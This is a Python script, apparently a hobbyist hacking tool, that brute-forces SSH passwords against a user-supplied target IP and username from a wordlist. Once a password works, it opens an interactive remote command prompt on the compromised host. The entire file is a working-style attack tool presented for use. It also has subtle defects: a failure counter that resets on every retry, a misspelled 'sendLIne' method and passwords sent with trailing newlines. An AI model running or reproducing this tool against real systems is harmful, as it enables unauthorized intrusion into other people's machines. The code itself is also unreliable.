import pexpect
from pexpect import pxssh
import argparse
import time
from colored import fg, bg, attr

color = fg('green')
reset = attr('reset')

try:
	file1 = open('sshbrute.txt', 'r')
	print(' ')
	print (color + file1.read() + reset)
	file1.close()
except IOError:
	print('\nBanner File not found!')


def connect (target, username, passwd):

    fails = 0

    try:
        s = pxssh.pxssh()
        s.login(target, username, passwd)
        print("Password Found :D\n")
        print("Password is: " + passwd)
        print("\n")
        return s

    except Exception as e:
        if (fails > 5):
            print ("[-] Too many Socket Timeouts :(")
            exit(0)
        elif 'read_nonblocking' in str(e):
            fails += 1
            time.sleep(5)
            return connect(target, username, passwd)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            return connect(target, username, passwd)
        return None


def Main():

    target = input("Enter Target IP Address: ")
    print("\n")
    username = input("Enter Target Username: ")
    print("\n")
    wordlist = input("Enter wordlist filepath: ")
    print("\n")

    flag = 0

    if (target and username and wordlist):
        with open(wordlist, 'r') as passfile:
            for passwd in passfile:
                print("[-] Passsword Trying...." + passwd)
                con = connect(target, username, passwd)
                if con:
                    flag = 1
                    print("[+] SSH Connected\n")
                    print("Press (q or Q) to Quit")
                    command = input(">")
                    while (command != 'q' and command != 'Q'):
                        con.sendLIne(command)
                        con.prompt()
                        print (con.before)
                        command = input(">")

    else:
        exit(0)

    if (flag == 0):
        print("Password not found :(\n")
        print("Please modify your wordlist !\n")

if __name__=='__main__':
    Main()
